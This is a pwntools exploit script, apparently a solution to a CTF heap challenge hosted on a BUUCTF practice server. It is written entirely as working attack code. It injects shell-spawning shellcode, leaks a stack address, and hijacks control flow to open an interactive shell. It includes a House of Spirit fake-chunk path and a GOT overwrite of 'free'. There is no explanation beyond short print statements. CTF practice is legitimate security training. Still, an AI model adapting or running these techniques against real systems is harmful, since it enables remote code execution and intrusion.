from pwn import *

context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
io = remote('node4.buuoj.cn', 25439)
elf = ELF("./pwn")
libc = elf.libc

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
sc   = lambda n    : io.recv(n)
sut  = lambda s    : io.recvuntil(s, drop=True)
suf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
sh   = lambda      : io.interactive()

def debug():
	gdb.attach(io)
	pause()

menu = b'your choice : '
def In(size, content):
	sla(menu, b'1')
	sla(b'long?\n', str(size).encode())
	sla(b'money : ', content)	

def Out():
	sla(menu, b'2')

def Exit():
	sla(menu, b'3')

shellcode = asm(shellcraft.sh())
print("shellcode len: ", hex(len(shellcode)))
sda(b'u?\n', shellcode)
sc(48)
rbp = addr(b',')
print("rbp: ", hex(rbp))
shellcode_addr = rbp - 0x50

def hos():
	fake_chunk_addr = rbp - 0xB0
	next_chunk_size = 0x41
	print("fake_chunk_addr: ", hex(fake_chunk_addr))

	sla(b'id ~~?\n', b'65')
	payload = p64(0) + p64(0x60) + p64(0)*5 + p64(fake_chunk_addr)
	sla(b'money~\n', payload)
	#debug()
	Out()
	#debug()
	payload = p64(0xdeadbeef)*7 + p64(shellcode_addr)
	In(0x50, payload)
	Exit()
	sh()

def exp():
	free_got = elf.got['free']
	sla(b'id ~~?\n', b'1')
	payload = p64(shellcode_addr) + p64(0)*6 + p64(free_got)
	sla(b'money~\n', payload)
	Out()
	sh() 	

if __name__ == "__main__":
	#hos()
	exp()



